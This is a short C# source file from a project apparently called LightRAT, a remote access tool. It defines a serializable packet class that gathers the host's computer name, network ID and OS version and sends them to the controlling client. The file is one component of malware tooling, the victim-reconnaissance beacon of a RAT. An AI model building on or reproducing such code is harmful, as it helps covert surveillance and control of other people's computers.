using System;
using System.Threading.Tasks;

namespace LightRAT.Network.Packets
{
    [Serializable]
    public class InformationPacket : IPacket
    {
        public string ComputerName { get; set; }
        public string NetworkId { get; set; }
        public string OSVersion { get; set; }
        public async Task Execute(Client client)
        {
            await client.SendPacket(this);
        }
    }
}
